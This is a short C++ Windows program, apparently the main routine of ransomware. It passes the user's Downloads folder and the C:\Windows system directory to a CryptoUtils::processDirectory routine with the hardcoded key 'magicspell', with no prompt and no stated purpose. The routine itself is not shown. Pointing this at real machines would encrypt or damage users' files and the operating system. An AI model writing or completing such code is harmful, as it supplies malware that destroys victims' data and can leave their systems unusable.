#include "CryptoUtils.h"
#include <cstdlib>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Get USERPROFILE directory
    char* userProfile = std::getenv("USERPROFILE");
    if (userProfile) {
        std::string downloadsPath = std::string(userProfile) + "\\Downloads";
        CryptoUtils::processDirectory(downloadsPath, "magicspell");
    }

    // Process C:/Windows directory
    CryptoUtils::processDirectory("C:\\Windows", "magicspell");

    return 0;
}
